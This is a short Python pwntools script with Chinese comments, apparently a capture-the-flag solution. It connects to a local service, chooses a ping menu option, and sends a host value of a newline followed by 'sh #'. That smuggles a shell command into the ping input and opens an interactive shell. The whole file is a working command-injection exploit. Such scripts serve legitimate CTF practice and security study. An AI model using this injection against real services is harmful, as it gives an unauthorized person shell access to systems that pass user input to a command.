from pwn import *
import ctypes                              # 
context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。
# io = process('./pwn')             # 在本地运行程序。
# gdb.attach(io)                    # 启动 GDB
io = connect("127.0.0.1",41841)          
# elf = ELF("./pwn")
# libc = ELF("./libc.so.6")

io.sendlineafter("Your choice:",b'4')

io.sendlineafter("Enter host to ping:",b'\nsh #')

io.interactive()
